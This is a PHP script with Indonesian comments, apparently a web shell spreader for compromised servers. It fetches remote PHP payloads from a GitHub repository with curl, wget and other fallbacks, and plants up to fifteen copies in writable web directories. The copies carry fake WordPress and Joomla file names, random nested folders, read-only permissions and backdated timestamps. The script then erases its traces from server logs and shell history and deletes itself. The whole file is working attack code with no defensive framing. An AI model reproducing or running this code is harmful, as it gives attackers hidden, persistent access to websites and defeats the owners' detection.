<?php
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', '0');
ini_set('log_errors', '0');

// Hapus jejak dari berbagai log
function clearTraces() {
    $script_name = basename(__FILE__);
    $script_path = __FILE__;
    $current_time = date('Y-m-d H:i:s');
    
    // Daftar lokasi log yang umum
    $log_paths = array(
        // Apache logs
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/httpd/access_log',
        '/var/log/httpd/error_log',
        '/usr/local/apache/logs/access_log',
        '/usr/local/apache/logs/error_log',
        
        // Nginx logs
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        
        // PHP logs
        '/var/log/php_errors.log',
        '/var/log/php/error.log',
        ini_get('error_log'),
        
        // System logs
        '/var/log/messages',
        '/var/log/syslog',
        
        // cPanel logs
        '/usr/local/cpanel/logs/access_log',
        '/usr/local/cpanel/logs/error_log',
        
        // Windows IIS logs (jika di Windows)
        'C:\inetpub\logs\LogFiles\W3SVC1\*.log',
        
        // Relative paths
        '../logs/access.log',
        '../logs/error.log',
        './logs/access.log',
        './logs/error.log',
        'logs/access.log',
        'logs/error.log'
    );
    
    foreach ($log_paths as $log_path) {
        if (@file_exists($log_path) && @is_writable($log_path)) {
            $content = @file_get_contents($log_path);
            if ($content) {
                // Hapus baris yang mengandung nama script ini
                $lines = explode("\n", $content);
                $cleaned_lines = array();
                foreach ($lines as $line) {
                    if (strpos($line, $script_name) === false && 
                        strpos($line, $script_path) === false) {
                        $cleaned_lines[] = $line;
                    }
                }
                @file_put_contents($log_path, implode("\n", $cleaned_lines));
            }
        }
    }
    
    // Hapus dari command history jika ada
    $history_files = array(
        $_SERVER['HOME'] . '/.bash_history',
        $_SERVER['HOME'] . '/.history',
        '/root/.bash_history',
        '/root/.history'
    );
    
    foreach ($history_files as $hist_file) {
        if (@file_exists($hist_file) && @is_writable($hist_file)) {
            $content = @file_get_contents($hist_file);
            if ($content) {
                $lines = explode("\n", $content);
                $cleaned_lines = array();
                foreach ($lines as $line) {
                    if (strpos($line, $script_name) === false) {
                        $cleaned_lines[] = $line;
                    }
                }
                @file_put_contents($hist_file, implode("\n", $cleaned_lines));
            }
        }
    }
    
    // Hapus file temporary yang mungkin terbuat
    $temp_dirs = array('/tmp', '/var/tmp', sys_get_temp_dir());
    foreach ($temp_dirs as $temp_dir) {
        if (@is_dir($temp_dir)) {
            $temp_files = @glob($temp_dir . '/*' . $script_name . '*');
            if ($temp_files) {
                foreach ($temp_files as $temp_file) {
                    @unlink($temp_file);
                }
            }
        }
    }
    
    // Clear opcode cache jika ada
    if (function_exists('opcache_reset')) {
        @opcache_reset();
    }
    if (function_exists('apc_clear_cache')) {
        @apc_clear_cache();
        @apc_clear_cache('user');
        @apc_clear_cache('opcode');
    }
}

define('MAX_SPREAD', 15);

$target_names = array(
    'index','main','default','common','user','client','server','config','setting','setup',
    'wp-config','wp-admin','wp-content','wp-includes','wp-login','wp-load','wp-blog-header',
    'wp-cron','wp-mail','wp-settings','wp-links-opml','wp-trackback','wp-comments-post',
    'xmlrpc','functions','template','theme','plugin','widget','sidebar','header','footer',
    'single','page','archive','category','tag','search','author','date','home','front',
    'admin','dashboard','posts','pages','media','comments','appearance','plugins','users',
    'tools','settings','profile','edit','new','view','list','add','delete','update',
    'wp-core','wp-db','wp-cache','wp-debug','wp-error','wp-script','wp-style','wp-ajax',
    'wp-json','wp-api','wp-rest','wp-cli','wp-migrate','wp-backup','wp-restore','wp-export',
    'wp-import','wp-upload','wp-download','wp-security','wp-firewall','wp-protection',
    'maintenance','htaccess','robots','sitemap','feed','rss','atom','favicon','manifest',
    'service-worker','sw','pwa','amp','seo','meta','schema','opengraph','twitter-card',
    'analytics','tracking','pixel','gtag','fbpixel','conversion','remarketing','retargeting',
    'newsletter','subscription','contact','form','submit','validate','sanitize','escape',
    'nonce','csrf','token','session','cookie','cache','transient','option','meta',
    'custom-post','custom-field','acf','cf7','woocommerce','elementor','gutenberg',
    'block','shortcode','hook','filter','action','init','ready','load','unload',
    'configuration','global','defines','framework','libraries','includes','layouts',
    'components','modules','extensions','plugins-joomla','templates-joomla','administrator',
    'component','module','plugin-j','template-j','library','helper','model','view','controller',
    'joomla-config','joomla-admin','joomla-core','joomla-api','joomla-cli','joomla-cache',
    'joomla-db','joomla-session','joomla-user','joomla-menu','joomla-article','joomla-category',
    'com-content','com-users','com-menus','com-modules','com-plugins','com-templates',
    'com-languages','com-installer','com-finder','com-contact','com-newsfeeds','com-weblinks',
    'mod-menu','mod-login','mod-articles','mod-breadcrumbs','mod-search','mod-footer',
    'mod-random','mod-related','mod-stats','mod-wrapper','mod-feed','mod-custom',
    'plg-authentication','plg-content','plg-editors','plg-search','plg-system','plg-user',
    'tmpl-beez','tmpl-atomic','tmpl-protostar','tmpl-cassiopeia','tmpl-atum','tmpl-system',
    'lib-joomla','lib-framework','lib-database','lib-filesystem','lib-registry','lib-session',
    'helper-content','helper-route','helper-category','helper-tags','helper-association',
    'model-list','model-item','model-form','view-html','view-json','view-xml','view-raw',
    'controller-form','controller-admin','controller-display','layout-default','layout-blog',
    'field-calendar','field-editor','field-list','field-media','field-user','field-category',
    'table-content','table-categories','table-users','table-menu','table-modules','table-extensions',
    'router','dispatcher','application','document','language','error','log','profiler',
    'jhtml','jtext','jroute','jtable','jform','jfactory','jversion','jpath','juri'
);

$folder_prefixes = array(
    'assets',
    // WordPress folder prefixes
    'wp-content','wp-includes','wp-admin','wp-uploads','wp-themes','wp-plugins',
    'wp-cache','wp-backup','wp-temp','wp-logs','wp-config','wp-scripts',
    'wp-styles','wp-media','wp-files','wp-data','wp-json','wp-api',
    'wp-core','wp-lib','wp-framework','wp-modules','wp-widgets','wp-blocks',
    'themes','plugins','uploads','cache','backup','temp','logs','media',
    'files','data','json','api','core','lib','framework','modules',
    'widgets','blocks','templates','layouts','components','shortcodes',
    'hooks','filters','actions','functions','classes','helpers','utils',
    'config','settings','options','meta','custom','fields','posts',
    // Joomla folder prefixes  
    'components','modules','plugins-j','templates-j','libraries','language',
    'administrator','media-j','cache-j','logs-j','tmp','configuration',
    'includes-j','layouts-j','cli','bin','installation','joomla-core',
    'joomla-lib','joomla-framework','joomla-api','joomla-cli','joomla-cache',
    'joomla-logs','joomla-temp','joomla-media','joomla-files','joomla-data',
    'com-content','com-users','com-menus','com-contact','com-finder',
    'mod-menu','mod-login','mod-articles','mod-search','mod-custom',
    'plg-system','plg-content','plg-user','plg-authentication','plg-editors',
    'tmpl-system','tmpl-protostar','tmpl-cassiopeia','tmpl-beez','tmpl-atomic',
    'lib-joomla','lib-framework','lib-database','lib-cms','lib-legacy',
    'helper','model','view','controller','table','field','form','router'
);

$file_extensions = array(
    '.php',
);

$remote_urls = [
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/mini-idp.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/tuns.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/404.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/avril.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/tunnel.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/mini-sep-gambar.php',
    'https://raw.githubusercontent.com/gankexploitersss/kekekekekekekekeke/refs/heads/main/mini-xml.php',

];

function fetchContents($urls) {
    $out = [];
    $success_count = 0;
    $total_count = count($urls);
    
    foreach ($urls as $url) {
        // Method 1: file_get_contents
        $content = @file_get_contents($url);
        if ($content && strlen($content) > 10) {
            $out[] = $content; 
            $success_count++;
            continue;
        }
        
        // Method 2: cURL (dengan pengecekan yang lebih baik)
        if (function_exists('curl_init') && function_exists('curl_exec')) {
            $ch = @curl_init($url);
            if ($ch !== false) {
                @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                @curl_setopt($ch, CURLOPT_TIMEOUT, 10);
                @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
                $content = @curl_exec($ch);
                @curl_close($ch);
                if ($content && strlen($content) > 10) {
                    $out[] = $content; 
                    $success_count++;
                    continue;
                }
            }
        }
        
        // Method 3: fopen
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => 10,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'ignore_errors' => true
            ]
        ]);
        $f = @fopen($url, 'r', false, $context);
        if ($f) {
            $content = '';
            while (!feof($f)) $content .= fread($f, 1024);
            fclose($f);
            if (strlen($content) > 10) {
                $out[] = $content; 
                $success_count++;
                continue;
            }
        }
        
        // Method 4: shell_exec curl (jika tersedia)
        if (function_exists('shell_exec')) {
            $content = @shell_exec("curl -s -L --max-time 10 '$url' 2>/dev/null");
            if ($content && strlen($content) > 10) {
                $out[] = $content; 
                $success_count++;
                continue;
            }
            
            // Method 5: shell_exec wget (jika tersedia)
            $content = @shell_exec("wget -qO- --timeout=10 '$url' 2>/dev/null");
            if ($content && strlen($content) > 10) {
                $out[] = $content; 
                $success_count++;
                continue;
            }
        }
    }
    
    echo "Berhasil mengambil $success_count dari $total_count payload.\n";
    return $out;
}

function getWritableDirsRecursive($base, $maxDepth = 3, $currentDepth = 0) {
    $writables = [];
    if ($currentDepth > $maxDepth) return [];
    $items = @scandir($base) ?: [];
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $base . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            @chmod($path, 0755);
            if (is_writable($path)) $writables[] = $path;
            $subdirs = getWritableDirsRecursive($path, $maxDepth, $currentDepth + 1);
            $writables = array_merge($writables, $subdirs);
        }
    }
    return $writables;
}

function randomNestedSubfolder($base, $levels) {
    global $folder_prefixes;
    $path = $base;
    
    // Array nama subfolder yang lebih natural
    $natural_suffixes = array(
        'backup','temp','cache','old','new','dev','test','staging','prod','live',
        'data','files','images','docs','scripts','styles','fonts','icons','uploads',
        'v1','v2','v3','beta','alpha','release','stable','latest','current','archive',
        '2023','2024','2025','jan','feb','mar','apr','may','jun','jul','aug','sep','oct','nov','dec',
        'mobile','desktop','admin','public','private','secure','ssl','api','ajax','json',
        'en','id','us','uk','fr','de','es','it','pt','nl','ru','cn','jp','kr'
    );
    
    for ($i = 0; $i < $levels; $i++) {
        $pf = $folder_prefixes[array_rand($folder_prefixes)];
        
        // 60% kemungkinan menggunakan nama folder tanpa suffix
        // 40% kemungkinan menggunakan suffix natural
        if (rand(1, 100) <= 60) {
            $sub = $pf;
        } else {
            $suffix = $natural_suffixes[array_rand($natural_suffixes)];
            $sub = $pf . '-' . $suffix;
        }
        
        $path .= DIRECTORY_SEPARATOR . $sub;
        if (!is_dir($path)) @mkdir($path, 0755, true);
    }
    return $path;
}

$base = rtrim($_SERVER['DOCUMENT_ROOT'], "\\/");
$dirs = getWritableDirsRecursive($base, 3);
shuffle($dirs);

echo "Mencoba mengambil payload dari remote URLs...\n";
$payloads = fetchContents($remote_urls);

if (empty($payloads)) {
    echo "Remote payload gagal diambil. Mencoba menggunakan mini-idp.txt...\n";
    
    // Cari file mini-idp.txt di direktori saat ini
    $current_dir = dirname(__FILE__);
    $fallback_file = $current_dir . DIRECTORY_SEPARATOR . 'mini-idp.txt';
    
    if (file_exists($fallback_file) && is_readable($fallback_file)) {
        $fallback_content = file_get_contents($fallback_file);
        if ($fallback_content && strlen($fallback_content) > 10) {
            $payloads = array($fallback_content);
            echo "Berhasil menggunakan content dari mini-idp.txt sebagai payload.\n";
        } else {
            die('File mini-idp.txt kosong atau tidak valid.');
        }
    } else {
        die('File mini-idp.txt tidak ditemukan di direktori: ' . $current_dir);
    }
} else {
    echo "Berhasil mengambil " . count($payloads) . " payload dari remote.\n";
}

$placed = 0;
foreach ($dirs as $dir) {
    if ($placed >= MAX_SPREAD) break;
    $payload = $payloads[array_rand($payloads)];
    
    // Coba beberapa kali untuk membuat file dengan nama unik
    $attempts = 0;
    $maxAttempts = 5;
    $fileCreated = false;
    
    while ($attempts < $maxAttempts && !$fileCreated) {
        $name = $target_names[array_rand($target_names)];
        $ext = $file_extensions[array_rand($file_extensions)];
        $filename = $name . $ext;
        
        $depth = rand(0, 2);
        $target_dir = $depth > 0 ? randomNestedSubfolder($dir, $depth) : $dir;
        @chmod($target_dir, 0755);
        $dest = $target_dir . DIRECTORY_SEPARATOR . $filename;
        
        // Jika file sudah ada, coba nama alternatif
        if (file_exists($dest)) {
            $attempts++;
            // Coba dengan suffix alternatif
            $alt_suffixes = array('2','bak','old','new','tmp','backup','copy');
            $alt_suffix = $alt_suffixes[array_rand($alt_suffixes)];
            $filename = $name . '-' . $alt_suffix . $ext;
            $dest = $target_dir . DIRECTORY_SEPARATOR . $filename;
            
            // Jika masih ada, coba folder berbeda di attempt selanjutnya
            if (file_exists($dest)) {
                continue;
            }
        }
        
        if (@file_put_contents($dest, $payload) !== false) {
            $fileCreated = true;
            @chmod($dest, rand(0,1) ? 0444 : 0644);
            
            // Set timestamp random untuk menghindari deteksi
            $randTime = strtotime(rand(2010,2020).'-'.rand(1,12).'-'.rand(1,28).' '.rand(0,23).':'.rand(0,59).':'.rand(0,59));
            @touch($dest, $randTime, $randTime);
            
            // Hapus dari stat cache
            @clearstatcache(true, $dest);
            
            $rel = str_replace($base, '', $dest);
            $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $host = $_SERVER['HTTP_HOST'];
            echo "<a href=\"{$proto}://{$host}" . str_replace('\\','/',$rel) . "\" target=\"_blank\">{$proto}://{$host}" . str_replace('\\','/',$rel) . "</a><br>";
            $placed++;
        } else {
            $attempts++;
        }
    }
    
    // Jika gagal membuat file setelah beberapa attempt, lanjut ke direktori berikutnya
    if (!$fileCreated) {
        continue;
    }
}

echo "\n=== RINGKASAN ===\n";
echo "Total file berhasil ditempatkan: $placed\n";
echo "Target maksimal: " . MAX_SPREAD . "\n";

// Hapus jejak dari log sebelum menghapus script
echo "\nMembersihkan jejak dari log sistem...\n";
clearTraces();

// === Langkah : Hapus File tebarshel.php Sendiri ===
echo "\nScript tebar-v8.php akan dihapus sendiri...\n";
if (unlink(__FILE__)) {
    echo "tebar-v8.php telah dihapus.\n";
} else {
    echo "Gagal menghapus tebar-v8.php. Harap hapus secara manual.\n";
}
?>
